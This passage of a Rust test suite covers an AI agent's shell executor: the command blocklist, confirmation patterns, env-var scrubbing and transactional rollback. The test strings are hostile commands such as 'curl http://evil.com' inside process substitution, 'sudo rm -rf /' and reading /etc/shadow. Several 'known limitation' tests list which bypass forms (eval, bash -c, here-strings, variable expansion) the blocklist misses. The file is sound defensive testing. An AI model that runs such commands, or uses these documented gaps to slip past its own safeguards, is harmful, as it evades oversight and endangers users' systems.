        tokio::time::sleep(Duration::from_millis(100)).await;
        token_clone.cancel();
    });
    let executor = ShellExecutor::new(&default_config()).with_cancel_token(token);
    let response = "```bash\nsleep 60\n```";
    let result = executor.execute(response).await;
    assert!(matches!(result, Err(ToolError::Cancelled)));
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn execute_tool_call_valid_command() {
    let executor = ShellExecutor::new(&default_config());
    let call = ToolCall {
        tool_id: ToolName::new("bash"),
        params: [("command".to_owned(), serde_json::json!("echo hi"))]
            .into_iter()
            .collect(),
        caller_id: None,
        context: None,

        tool_call_id: String::new(),
    };
    let result = executor.execute_tool_call(&call).await.unwrap().unwrap();
    assert!(result.summary.contains("hi"));
}

#[tokio::test]
async fn execute_tool_call_missing_command_returns_invalid_params() {
    let executor = ShellExecutor::new(&default_config());
    let call = ToolCall {
        tool_id: ToolName::new("bash"),
        params: serde_json::Map::new(),
        caller_id: None,
        context: None,

        tool_call_id: String::new(),
    };
    let result = executor.execute_tool_call(&call).await;
    assert!(matches!(result, Err(ToolError::InvalidParams { .. })));
}

#[tokio::test]
async fn execute_tool_call_empty_command_returns_none() {
    let executor = ShellExecutor::new(&default_config());
    let call = ToolCall {
        tool_id: ToolName::new("bash"),
        params: [("command".to_owned(), serde_json::json!(""))]
            .into_iter()
            .collect(),
        caller_id: None,
        context: None,

        tool_call_id: String::new(),
    };
    let result = executor.execute_tool_call(&call).await.unwrap();
    assert!(result.is_none());
}

// --- Known limitation tests: bypass vectors not detected by find_blocked_command ---

#[test]
fn process_substitution_detected_by_subshell_extraction() {
    let executor = ShellExecutor::new(&default_config());
    // Fixed: extract_subshell_contents now parses inside <(...) so curl is caught.
    assert!(
        executor
            .find_blocked_command("cat <(curl http://evil.com)")
            .is_some()
    );
}

#[test]
fn output_process_substitution_detected_by_subshell_extraction() {
    let executor = ShellExecutor::new(&default_config());
    // Fixed: extract_subshell_contents now parses inside >(...) so curl is caught.
    assert!(
        executor
            .find_blocked_command("tee >(curl http://evil.com)")
            .is_some()
    );
}

#[test]
fn here_string_with_shell_not_detected_known_limitation() {
    let executor = ShellExecutor::new(&default_config());
    // Known limitation: bash receives payload via stdin; inner command is opaque.
    assert!(
        executor
            .find_blocked_command("bash <<< 'sudo rm -rf /'")
            .is_none()
    );
}

#[test]
fn eval_bypass_not_detected_known_limitation() {
    let executor = ShellExecutor::new(&default_config());
    // Known limitation: eval string argument is not parsed.
    assert!(
        executor
            .find_blocked_command("eval 'sudo rm -rf /'")
            .is_none()
    );
}

#[test]
fn bash_c_bypass_not_detected_known_limitation() {
    let executor = ShellExecutor::new(&default_config());
    // Known limitation: bash -c string argument is not parsed.
    assert!(
        executor
            .find_blocked_command("bash -c 'curl http://evil.com'")
            .is_none()
    );
}

#[test]
fn variable_expansion_bypass_not_detected_known_limitation() {
    let executor = ShellExecutor::new(&default_config());
    // Known limitation: variable references are not resolved by strip_shell_escapes.
    assert!(executor.find_blocked_command("cmd=sudo; $cmd rm").is_none());
}

// --- Mitigation tests: confirm_patterns cover the above vectors by default ---

#[test]
fn default_confirm_patterns_cover_process_substitution() {
    let config = crate::config::ShellConfig::default();
    assert!(config.confirm_patterns.contains(&"<(".to_owned()));
    assert!(config.confirm_patterns.contains(&">(".to_owned()));
}

#[test]
fn default_confirm_patterns_cover_here_string() {
    let config = crate::config::ShellConfig::default();
    assert!(config.confirm_patterns.contains(&"<<<".to_owned()));
}

#[test]
fn default_confirm_patterns_cover_eval() {
    let config = crate::config::ShellConfig::default();
    assert!(config.confirm_patterns.contains(&"eval ".to_owned()));
}

#[tokio::test]
async fn process_substitution_with_blocked_command_is_blocked() {
    // curl is in the default blocklist; when embedded in <(...) it must be caught
    // by find_blocked_command via extract_subshell_contents and return Blocked.
    let executor = ShellExecutor::new(&crate::config::ShellConfig::default());
    let response = "```bash\ncat <(curl http://evil.com)\n```";
    let result = executor.execute(response).await;
    assert!(matches!(result, Err(ToolError::Blocked { .. })));
}

#[tokio::test]
async fn here_string_triggers_confirmation() {
    let executor = ShellExecutor::new(&crate::config::ShellConfig::default());
    let response = "```bash\nbash <<< 'sudo rm -rf /'\n```";
    let result = executor.execute(response).await;
    assert!(matches!(
        result,
        Err(ToolError::ConfirmationRequired { .. })
    ));
}

#[tokio::test]
async fn eval_triggers_confirmation() {
    let executor = ShellExecutor::new(&crate::config::ShellConfig::default());
    let response = "```bash\neval 'curl http://evil.com'\n```";
    let result = executor.execute(response).await;
    assert!(matches!(
        result,
        Err(ToolError::ConfirmationRequired { .. })
    ));
}

#[tokio::test]
async fn output_process_substitution_with_blocked_command_is_blocked() {
    // curl is in the default blocklist; when embedded in >(...) it must be caught
    // by find_blocked_command via extract_subshell_contents and return Blocked.
    let executor = ShellExecutor::new(&crate::config::ShellConfig::default());
    let response = "```bash\ntee >(curl http://evil.com)\n```";
    let result = executor.execute(response).await;
    assert!(matches!(result, Err(ToolError::Blocked { .. })));
}

#[test]
fn here_string_with_command_substitution_not_detected_known_limitation() {
    let executor = ShellExecutor::new(&default_config());
    // Known limitation: bash receives payload via stdin; inner command substitution is opaque.
    assert!(executor.find_blocked_command("bash <<< $(id)").is_none());
}

// --- check_blocklist direct tests (GAP-001) ---

fn default_blocklist() -> Vec<String> {
    DEFAULT_BLOCKED.iter().map(|s| (*s).to_owned()).collect()
}

#[test]
fn check_blocklist_blocks_rm_rf_root() {
    let bl = default_blocklist();
    assert!(check_blocklist("rm -rf /", &bl).is_some());
}

#[test]
fn check_blocklist_blocks_sudo() {
    let bl = default_blocklist();
    assert!(check_blocklist("sudo apt install vim", &bl).is_some());
}

#[test]
fn check_blocklist_allows_safe_commands() {
    let bl = default_blocklist();
    assert!(check_blocklist("ls -la", &bl).is_none());
    assert!(check_blocklist("echo hello world", &bl).is_none());
    assert!(check_blocklist("git status", &bl).is_none());
    assert!(check_blocklist("cargo build --release", &bl).is_none());
}

#[test]
fn check_blocklist_blocks_subshell_dollar_paren() {
    let bl = default_blocklist();
    // Subshell $(sudo ...) must be rejected even if outer command is benign.
    assert!(check_blocklist("echo $(sudo id)", &bl).is_some());
    assert!(check_blocklist("echo $(rm -rf /tmp)", &bl).is_some());
}

#[test]
fn check_blocklist_blocks_subshell_backtick() {
    let bl = default_blocklist();
    assert!(check_blocklist("cat `sudo cat /etc/shadow`", &bl).is_some());
}

#[test]
fn check_blocklist_blocks_mkfs() {
    let bl = default_blocklist();
    assert!(check_blocklist("mkfs.ext4 /dev/sda1", &bl).is_some());
}

#[test]
fn check_blocklist_blocks_shutdown() {
    let bl = default_blocklist();
    assert!(check_blocklist("shutdown -h now", &bl).is_some());
}

// --- effective_shell_command tests ---

#[test]
fn effective_shell_command_bash_minus_c() {
    let args = vec!["-c".to_owned(), "rm -rf /".to_owned()];
    assert_eq!(effective_shell_command("bash", &args), Some("rm -rf /"));
}

#[test]
fn effective_shell_command_sh_minus_c() {
    let args = vec!["-c".to_owned(), "sudo ls".to_owned()];
    assert_eq!(effective_shell_command("sh", &args), Some("sudo ls"));
}

#[test]
fn effective_shell_command_non_shell_returns_none() {
    let args = vec!["-c".to_owned(), "rm -rf /".to_owned()];
    assert_eq!(effective_shell_command("git", &args), None);
    assert_eq!(effective_shell_command("cargo", &args), None);
}

#[test]
fn effective_shell_command_no_minus_c_returns_none() {
    let args = vec!["script.sh".to_owned()];
    assert_eq!(effective_shell_command("bash", &args), None);
}

#[test]
fn effective_shell_command_full_path_shell() {
    let args = vec!["-c".to_owned(), "sudo rm".to_owned()];
    assert_eq!(
        effective_shell_command("/usr/bin/bash", &args),
        Some("sudo rm")
    );
}

#[test]
fn check_blocklist_blocks_process_substitution_lt() {
    let bl = vec!["curl".to_owned(), "wget".to_owned()];
    assert!(check_blocklist("cat <(curl http://evil.com)", &bl).is_some());
}

#[test]
fn check_blocklist_blocks_process_substitution_gt() {
    let bl = vec!["wget".to_owned()];
    assert!(check_blocklist("tee >(wget http://evil.com)", &bl).is_some());
}

#[test]
fn find_blocked_backtick_wrapping() {
    let executor = ShellExecutor::new(&ShellConfig {
        blocked_commands: vec!["curl".to_owned()],
        ..default_config()
    });
    assert!(
        executor
            .find_blocked_command("echo `curl --version 2>&1 | head -1`")
            .is_some()
    );
}

#[test]
fn find_blocked_process_substitution_lt() {
    let executor = ShellExecutor::new(&ShellConfig {
        blocked_commands: vec!["wget".to_owned()],
        ..default_config()
    });
    assert!(
        executor
            .find_blocked_command("cat <(wget --version 2>&1 | head -1)")
            .is_some()
    );
}

#[test]
fn find_blocked_process_substitution_gt() {
    let executor = ShellExecutor::new(&ShellConfig {
        blocked_commands: vec!["curl".to_owned()],
        ..default_config()
    });
    assert!(
        executor
            .find_blocked_command("tee >(curl http://evil.com)")
            .is_some()
    );
}

#[test]
fn find_blocked_dollar_paren_wrapping() {
    let executor = ShellExecutor::new(&ShellConfig {
        blocked_commands: vec!["curl".to_owned()],
        ..default_config()
    });
    assert!(
        executor
            .find_blocked_command("echo $(curl http://evil.com)")
            .is_some()
    );
}

// --- Regression tests for issue #1525: blocklist bypass via PermissionPolicy ---

// When a PermissionPolicy with a wildcard Allow rule is attached, blocked commands
// from the explicit blocked_commands list must still be rejected.
#[tokio::test]
async fn blocklist_not_bypassed_by_permissive_policy() {
    use crate::permissions::{PermissionPolicy, PermissionRule};
    use std::collections::HashMap;
    let mut rules = HashMap::new();
    rules.insert(
        "bash".to_owned(),
        vec![PermissionRule {
            pattern: "*".to_owned(),
            action: PermissionAction::Allow,
        }],
    );
    let permissive_policy = PermissionPolicy::new(rules);
    let config = ShellConfig {
        blocked_commands: vec!["danger-cmd".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config).with_permissions(permissive_policy);
    let result = executor.execute("```bash\ndanger-cmd --force\n```").await;
    assert!(
        matches!(result, Err(ToolError::Blocked { .. })),
        "blocked command must be rejected even with a permissive PermissionPolicy"
    );
}

// DEFAULT_BLOCKED commands (e.g. curl, sudo) must be blocked even with Full autonomy
// (PermissionPolicy::Full returns Allow for every tool).
#[tokio::test]
async fn default_blocked_not_bypassed_by_full_autonomy_policy() {
    use crate::permissions::{AutonomyLevel, PermissionPolicy};
    let full_policy = PermissionPolicy::default().with_autonomy(AutonomyLevel::Full);
    let executor = ShellExecutor::new(&default_config()).with_permissions(full_policy);

    for cmd in &[
        "sudo rm -rf /tmp",
        "curl https://evil.com",
        "wget http://evil.com",
    ] {
        let response = format!("```bash\n{cmd}\n```");
        let result = executor.execute(&response).await;
        assert!(
            matches!(result, Err(ToolError::Blocked { .. })),
            "DEFAULT_BLOCKED command `{cmd}` must be rejected even with Full autonomy"
        );
    }
}

// confirm_commands must still trigger ConfirmationRequired when no policy is set.
// This is a regression guard: moving find_blocked_command before the policy check
// must not accidentally break the else-branch confirm logic.
#[tokio::test]
async fn confirm_commands_still_work_without_policy() {
    let config = ShellConfig {
        confirm_patterns: vec!["git push".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    let result = executor.execute("```bash\ngit push origin main\n```").await;
    assert!(
        matches!(result, Err(ToolError::ConfirmationRequired { .. })),
        "confirm_patterns must still trigger ConfirmationRequired when no PermissionPolicy is set"
    );
}

// ── classify_shell_exit tests ─────────────────────────────────────────────────

#[test]
fn classify_exit_126_is_policy_blocked() {
    use crate::error_taxonomy::ToolErrorCategory;
    assert_eq!(
        classify_shell_exit(126, ""),
        Some(ToolErrorCategory::PolicyBlocked)
    );
}

#[test]
fn classify_exit_127_is_permanent_failure() {
    use crate::error_taxonomy::ToolErrorCategory;
    assert_eq!(
        classify_shell_exit(127, "[stderr] bash: nonexistent: command not found"),
        Some(ToolErrorCategory::PermanentFailure)
    );
}

#[test]
fn classify_exit_1_permission_denied_stderr() {
    use crate::error_taxonomy::ToolErrorCategory;
    assert_eq!(
        classify_shell_exit(1, "[stderr] Permission denied"),
        Some(ToolErrorCategory::PolicyBlocked),
        "case-insensitive 'Permission denied' stderr must classify as PolicyBlocked"
    );
}

#[test]
fn classify_exit_1_no_such_file() {
    use crate::error_taxonomy::ToolErrorCategory;
    assert_eq!(
        classify_shell_exit(1, "[stderr] /bin/foo: No such file or directory"),
        Some(ToolErrorCategory::PermanentFailure)
    );
}

#[test]
fn classify_exit_0_returns_none() {
    assert_eq!(classify_shell_exit(0, ""), None);
}

#[test]
fn classify_exit_1_generic_returns_none() {
    assert_eq!(classify_shell_exit(1, "some other error"), None);
}

// --- env_blocklist / scrubbing tests ---

#[cfg(unix)]
#[allow(unsafe_code)]
#[tokio::test]
async fn env_blocklist_strips_sensitive_vars() {
    // Set a fake sensitive env var in the current process
    unsafe { std::env::set_var("ZEPH_SECRET_TEST_VAR", "should-not-leak") };
    let blocklist = vec!["ZEPH_".to_owned()];
    let (envelope, result) = execute_bash(
        "echo ${ZEPH_SECRET_TEST_VAR:-absent}",
        Duration::from_secs(5),
        None,
        None,
        None,
        &blocklist,
        None,
        "",
    )
    .await;
    unsafe { std::env::remove_var("ZEPH_SECRET_TEST_VAR") };
    assert_eq!(envelope.exit_code, 0);
    assert!(
        result.contains("absent"),
        "ZEPH_ var should have been stripped, got: {result}"
    );
}

#[cfg(unix)]
#[tokio::test]
async fn env_blocklist_preserves_safe_vars() {
    let blocklist = vec!["ZEPH_".to_owned()];
    // PATH and HOME are always set in the test environment; verify they are inherited.
    let (envelope, result) = execute_bash(
        "echo ${PATH:+present}",
        Duration::from_secs(5),
        None,
        None,
        None,
        &blocklist,
        None,
        "",
    )
    .await;
    assert_eq!(envelope.exit_code, 0);
    assert!(
        result.contains("present"),
        "PATH should be preserved, got: {result}"
    );
}

#[cfg(unix)]
#[tokio::test]
async fn env_blocklist_extra_env_still_injected() {
    // Even with a blocklist active, skill-provided extra_env vars must be passed through.
    let blocklist = vec!["ZEPH_".to_owned()];
    let mut extra = std::collections::HashMap::new();
    extra.insert("SKILL_TEST_VAR".to_owned(), "skill-value".to_owned());
    let (envelope, result) = execute_bash(
        "echo $SKILL_TEST_VAR",
        Duration::from_secs(5),
        None,
        None,
        Some(&extra),
        &blocklist,
        None,
        "",
    )
    .await;
    assert_eq!(envelope.exit_code, 0);
    assert!(
        result.contains("skill-value"),
        "skill extra_env should be injected, got: {result}"
    );
}

#[cfg(unix)]
#[allow(unsafe_code)]
#[tokio::test]
async fn env_blocklist_multiple_prefixes() {
    unsafe {
        std::env::set_var("AWS_SECRET_ACCESS_KEY", "aws-secret");
        std::env::set_var("OPENAI_API_KEY", "openai-secret");
    }
    let blocklist = vec!["AWS_".to_owned(), "OPENAI_".to_owned()];
    let (envelope, result) = execute_bash(
        "echo ${AWS_SECRET_ACCESS_KEY:-absent1} ${OPENAI_API_KEY:-absent2}",
        Duration::from_secs(5),
        None,
        None,
        None,
        &blocklist,
        None,
        "",
    )
    .await;
    unsafe {
        std::env::remove_var("AWS_SECRET_ACCESS_KEY");
        std::env::remove_var("OPENAI_API_KEY");
    }
    assert_eq!(envelope.exit_code, 0);
    assert!(
        result.contains("absent1"),
        "AWS_ var should be stripped, got: {result}"
    );
    assert!(
        result.contains("absent2"),
        "OPENAI_ var should be stripped, got: {result}"
    );
}

#[cfg(unix)]
#[allow(unsafe_code)]
#[tokio::test]
async fn empty_env_blocklist_passes_all_vars() {
    unsafe { std::env::set_var("ZEPH_EMPTY_BLOCKLIST_TEST", "visible") };
    let (envelope, result) = execute_bash(
        "echo ${ZEPH_EMPTY_BLOCKLIST_TEST:-absent}",
        Duration::from_secs(5),
        None,
        None,
        None,
        &[],
        None,
        "",
    )
    .await;
    unsafe { std::env::remove_var("ZEPH_EMPTY_BLOCKLIST_TEST") };
    assert_eq!(envelope.exit_code, 0);
    assert!(
        result.contains("visible"),
        "empty blocklist should pass all vars, got: {result}"
    );
}

// ============================================================
// Transactional ShellExecutor tests (#2414)
// ============================================================

#[test]
fn transaction_snapshot_capture_and_rollback() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("data.txt");
    std::fs::write(&file, b"original").unwrap();

    let snap =
        super::transaction::TransactionSnapshot::capture(std::slice::from_ref(&file), 0).unwrap();
    assert_eq!(snap.file_count(), 1);

    std::fs::write(&file, b"modified").unwrap();
    assert_eq!(std::fs::read(&file).unwrap(), b"modified");

    snap.rollback().unwrap();
    assert_eq!(std::fs::read(&file).unwrap(), b"original");
}

#[test]
fn transaction_snapshot_new_file_rollback() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("new.txt");

    let snap =
        super::transaction::TransactionSnapshot::capture(std::slice::from_ref(&file), 0).unwrap();
    assert_eq!(snap.file_count(), 1);

    std::fs::write(&file, b"created").unwrap();
    assert!(file.exists());

    snap.rollback().unwrap();
    assert!(!file.exists());
}

#[test]
fn transaction_snapshot_empty_paths() {
    let snap = super::transaction::TransactionSnapshot::capture(&[], 0).unwrap();
    assert_eq!(snap.file_count(), 0);
    assert_eq!(snap.total_bytes(), 0);
    let report = snap.rollback().unwrap();
    assert_eq!(report.restored_count, 0);
    assert_eq!(report.deleted_count, 0);
}

#[test]
fn is_write_command_positive() {
    use super::transaction::is_write_command;
    assert!(is_write_command("echo hello > out.txt"));
    assert!(is_write_command("echo hello >> out.txt"));
    assert!(is_write_command("rm old.txt"));
    assert!(is_write_command("mv src dst"));
    assert!(is_write_command("cp a b"));
    assert!(is_write_command("sed -i 's/a/b/' file"));
    assert!(is_write_command("touch new.txt"));
    assert!(is_write_command("mkdir newdir"));
    assert!(is_write_command("tee output.log"));
}

#[test]
fn is_write_command_negative() {
    use super::transaction::is_write_command;
    assert!(!is_write_command("ls -la"));
    assert!(!is_write_command("cat file.txt"));
    assert!(!is_write_command("grep pattern file"));
    assert!(!is_write_command("echo hello"));
    assert!(!is_write_command("pwd"));
    assert!(!is_write_command("wc -l file.txt"));
}

#[test]
fn extract_redirection_targets_basic() {
    use super::transaction::extract_redirection_targets;
    let targets = extract_redirection_targets("echo x > file.txt");
    assert!(targets.contains(&"file.txt".to_owned()), "{targets:?}");
}

#[test]
fn extract_redirection_targets_append_and_stderr() {
    use super::transaction::extract_redirection_targets;
    let targets = extract_redirection_targets("cmd >> log 2> err.txt");
    assert!(targets.contains(&"log".to_owned()), "{targets:?}");
    assert!(targets.contains(&"err.txt".to_owned()), "{targets:?}");

    let targets2 = extract_redirection_targets("cmd 2>> stderr.log &> combined.log");
    assert!(targets2.contains(&"stderr.log".to_owned()), "{targets2:?}");
    assert!(
        targets2.contains(&"combined.log".to_owned()),
        "{targets2:?}"
    );
}

#[test]
fn affected_paths_with_scope() {
    use super::transaction::affected_paths;
    use globset::Glob;

    // Use redirection so extract_redirection_targets picks up the file names.
    // *.rs scope should include main.rs but not backup.txt
    let matcher = Glob::new("*.rs").unwrap().compile_matcher();
    let scope = vec![matcher];

    let paths = affected_paths("cat ./main.rs > /tmp/backup.txt", &scope);
    // ./main.rs matches *.rs, /tmp/backup.txt does not
    assert!(
        paths
            .iter()
            .any(|p| p.to_string_lossy().ends_with("main.rs")),
        "{paths:?}"
    );
    assert!(
        !paths
            .iter()
            .any(|p| p.to_string_lossy().ends_with("backup.txt")),
        "{paths:?}"
    );
}

#[test]
fn affected_paths_no_scope() {
    use super::transaction::affected_paths;

    // Use a redirect so extract_redirection_targets captures the target path.
    let paths = affected_paths("echo hello > /tmp/out.txt", &[]);
    assert!(
        paths
            .iter()
            .any(|p| p.to_string_lossy().ends_with("out.txt")),
        "expected /tmp/out.txt in paths, got {paths:?}"
    );
}

#[test]
fn config_deserialization() {
    let toml_str = r#"
        [shell]
        transactional = true
        transaction_scope = ["*.rs", "src/**"]
        auto_rollback = true
        auto_rollback_exit_codes = [2, 126]
        snapshot_required = true
    "#;
    let config: crate::config::ToolsConfig = toml::from_str(toml_str).unwrap();
    assert!(config.shell.transactional);
    assert_eq!(config.shell.transaction_scope, vec!["*.rs", "src/**"]);
    assert!(config.shell.auto_rollback);
    assert_eq!(config.shell.auto_rollback_exit_codes, vec![2, 126]);
    assert!(config.shell.snapshot_required);
}

#[test]
fn config_deserialization_defaults() {
    let toml_str = "[shell]\ntimeout = 30";
    let config: crate::config::ToolsConfig = toml::from_str(toml_str).unwrap();
    assert!(!config.shell.transactional);
    assert!(config.shell.transaction_scope.is_empty());
    assert!(!config.shell.auto_rollback);
    assert!(config.shell.auto_rollback_exit_codes.is_empty());
    assert!(!config.shell.snapshot_required);
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn auto_rollback_on_failure() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("target.txt");
    std::fs::write(&file, b"original").unwrap();

    let config = ShellConfig {
        transactional: true,
        auto_rollback: true,
        allowed_paths: vec![
            dir.path()
                .canonicalize()
                .unwrap_or_else(|_| dir.path().to_path_buf())
                .to_string_lossy()
                .into_owned(),
        ],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);

    let path_str = file
        .canonicalize()
        .unwrap_or_else(|_| file.clone())
        .to_string_lossy()
        .into_owned();
    // Write something then exit with code 2 (triggers rollback)
    let cmd = format!("```bash\necho modified > {path_str} && exit 2\n```");
    let _ = executor.execute(&cmd).await;

    // File should be restored to original
    let content = std::fs::read(&file).unwrap();
    assert_eq!(
        content, b"original",
        "file should be restored after rollback"
    );
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn no_rollback_on_success() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("target.txt");
    std::fs::write(&file, b"original").unwrap();

    let config = ShellConfig {
        transactional: true,
        auto_rollback: true,
        allowed_paths: vec![
            dir.path()
                .canonicalize()
                .unwrap_or_else(|_| dir.path().to_path_buf())
                .to_string_lossy()
                .into_owned(),
        ],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);

    let path_str = file
        .canonicalize()
        .unwrap_or_else(|_| file.clone())
        .to_string_lossy()
        .into_owned();
    let cmd = format!("```bash\necho modified > {path_str}\n```");
    let result = executor.execute(&cmd).await;
    assert!(result.is_ok());

    let content = std::fs::read(&file).unwrap();
    assert_eq!(
        content.trim_ascii_end(),
        b"modified",
        "successful command should not be rolled back"
    );
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn snapshot_failure_does_not_block() {
    use std::os::unix::fs::PermissionsExt;

    let dir = tempfile::tempdir().unwrap();
    let locked = dir.path().join("locked.txt");
    let output = dir.path().join("out.txt");
    std::fs::write(&locked, b"locked data").unwrap();

    // Make the existing file unreadable so snapshot copy fails.
    std::fs::set_permissions(&locked, std::fs::Permissions::from_mode(0o000)).unwrap();

    let canonical_dir = dir.path().canonicalize().unwrap();
    let config = ShellConfig {
        transactional: true,
        auto_rollback: false,
        snapshot_required: false, // failure must NOT abort execution
        allowed_paths: vec![canonical_dir.to_string_lossy().into_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);

    let locked_str = locked
        .canonicalize()
        .unwrap_or_else(|_| locked.clone())
        .to_string_lossy()
        .into_owned();
    let output_str = output.to_string_lossy().into_owned();
    // Write command referencing both locked (snapshot fails) and output (redirection target).
    let cmd = format!("```bash\ncp {locked_str} {output_str}\n```");
    let result = executor.execute(&cmd).await;

    // Restore permissions for cleanup.
    std::fs::set_permissions(&locked, std::fs::Permissions::from_mode(0o644)).unwrap();

    // Execution must proceed (snapshot failure is non-fatal when snapshot_required=false).
    // The cp may fail at the OS level (unreadable src) but must not return SnapshotFailed.
    assert!(
        !matches!(
            result,
            Err(crate::executor::ToolError::SnapshotFailed { .. })
        ),
        "snapshot_required=false should not return SnapshotFailed, got {result:?}"
    );
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn snapshot_failure_aborts_when_required() {
    use std::os::unix::fs::PermissionsExt;

    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("locked.txt");
    std::fs::write(&file, b"data").unwrap();

    // Make file unreadable so copy fails
    std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o000)).unwrap();

    let config = ShellConfig {
        transactional: true,
        auto_rollback: false,
        snapshot_required: true,
        allowed_paths: vec![
            dir.path()
                .canonicalize()
                .unwrap_or_else(|_| dir.path().to_path_buf())
                .to_string_lossy()
                .into_owned(),
        ],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);

    let path_str = file
        .canonicalize()
        .unwrap_or_else(|_| file.clone())
        .to_string_lossy()
        .into_owned();
    let cmd = format!("```bash\ncp {path_str} {path_str}.bak\n```");
    let result = executor.execute(&cmd).await;

    // Restore permissions for cleanup
    std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o644)).unwrap();

    assert!(
        matches!(
            result,
            Err(crate::executor::ToolError::SnapshotFailed { .. })
        ),
        "expected SnapshotFailed, got {result:?}"
    );
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn transactional_false_skips_snapshot() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("target.txt");
    std::fs::write(&file, b"original").unwrap();

    let config = ShellConfig {
        transactional: false, // disabled
        auto_rollback: true,
        allowed_paths: vec![
            dir.path()
                .canonicalize()
                .unwrap_or_else(|_| dir.path().to_path_buf())
                .to_string_lossy()
                .into_owned(),
        ],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);

    let path_str = file
        .canonicalize()
        .unwrap_or_else(|_| file.clone())
        .to_string_lossy()
        .into_owned();
    let cmd = format!("```bash\necho modified > {path_str} && exit 2\n```");
    let _ = executor.execute(&cmd).await;

    // No snapshot was taken, so file stays modified
    let content = std::fs::read(&file).unwrap();
    assert_eq!(
        content.trim_ascii_end(),
        b"modified",
        "without transactional, file should not be restored"
    );
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn no_rollback_on_exit_code_1() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("target.txt");
    std::fs::write(&file, b"original").unwrap();

    let config = ShellConfig {
        transactional: true,
        auto_rollback: true, // heuristic: rollback on exit >= 2, NOT on exit 1
        allowed_paths: vec![
            dir.path()
                .canonicalize()
                .unwrap_or_else(|_| dir.path().to_path_buf())
                .to_string_lossy()
                .into_owned(),
        ],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);

    let path_str = file
        .canonicalize()
        .unwrap_or_else(|_| file.clone())
        .to_string_lossy()
        .into_owned();
    let cmd = format!("```bash\necho modified > {path_str} && exit 1\n```");
    let _ = executor.execute(&cmd).await;

    let content = std::fs::read(&file).unwrap();
    assert_eq!(
        content.trim_ascii_end(),
        b"modified",
        "exit code 1 should NOT trigger rollback"
    );
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn rollback_on_exit_code_2() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("target.txt");
    std::fs::write(&file, b"original").unwrap();

    let config = ShellConfig {
        transactional: true,
        auto_rollback: true,
        allowed_paths: vec![
            dir.path()
                .canonicalize()
                .unwrap_or_else(|_| dir.path().to_path_buf())
                .to_string_lossy()
                .into_owned(),
        ],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);

    let path_str = file
        .canonicalize()
        .unwrap_or_else(|_| file.clone())
        .to_string_lossy()
        .into_owned();
    let cmd = format!("```bash\necho modified > {path_str} && exit 2\n```");
    let _ = executor.execute(&cmd).await;

    let content = std::fs::read(&file).unwrap();
    assert_eq!(content, b"original", "exit code 2 should trigger rollback");
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn custom_rollback_exit_codes() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("target.txt");
    std::fs::write(&file, b"original").unwrap();

    let config = ShellConfig {
        transactional: true,
        auto_rollback: true,
        auto_rollback_exit_codes: vec![42],
        allowed_paths: vec![
            dir.path()
                .canonicalize()
                .unwrap_or_else(|_| dir.path().to_path_buf())
                .to_string_lossy()
                .into_owned(),
        ],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);

    let path_str = file
        .canonicalize()
        .unwrap_or_else(|_| file.clone())
        .to_string_lossy()
        .into_owned();

    // exit 2 should NOT trigger rollback (not in the list)
    let cmd = format!("```bash\necho modified > {path_str} && exit 2\n```");
    let _ = executor.execute(&cmd).await;
    let content = std::fs::read(&file).unwrap();
    assert_eq!(
        content.trim_ascii_end(),
        b"modified",
        "exit 2 should not rollback when custom_rollback_exit_codes=[42]"
    );

    // Reset
    std::fs::write(&file, b"original").unwrap();

    // exit 42 SHOULD trigger rollback
    let cmd2 = format!("```bash\necho modified > {path_str} && exit 42\n```");
    let _ = executor.execute(&cmd2).await;
    let content2 = std::fs::read(&file).unwrap();
    assert_eq!(content2, b"original", "exit 42 should trigger rollback");
}

// --- snapshot size limit tests ---

#[test]
fn transaction_snapshot_size_limit_exceeded() {
    use crate::shell::transaction::TransactionSnapshot;
    let dir = tempfile::TempDir::new().unwrap();
    let file = dir.path().join("big.txt");
    // Write 100 bytes
    std::fs::write(&file, vec![b'x'; 100]).unwrap();

    let result = TransactionSnapshot::capture(&[file], 50);
    assert!(result.is_err());
    let msg = result.unwrap_err().to_string();
    assert!(msg.contains("exceeds limit"), "unexpected error: {msg}");
}

#[test]
fn transaction_snapshot_size_limit_zero_unlimited() {
    use crate::shell::transaction::TransactionSnapshot;
    let dir = tempfile::TempDir::new().unwrap();
    let file = dir.path().join("big.txt");
    std::fs::write(&file, vec![b'x'; 1_000_000]).unwrap();

    // max_bytes = 0 means unlimited — must succeed
    let result = TransactionSnapshot::capture(&[file], 0);
    assert!(result.is_ok());
}

#[test]
fn transaction_snapshot_size_limit_within_budget() {
    use crate::shell::transaction::TransactionSnapshot;
    let dir = tempfile::TempDir::new().unwrap();
    let file = dir.path().join("small.txt");
    std::fs::write(&file, b"hello").unwrap();

    let result = TransactionSnapshot::capture(&[file], 1024);
    assert!(result.is_ok());
}

// --- #2488: ShellOutputEnvelope tests ---

#[cfg(unix)]
#[tokio::test]
async fn shell_output_envelope_separates_streams() {
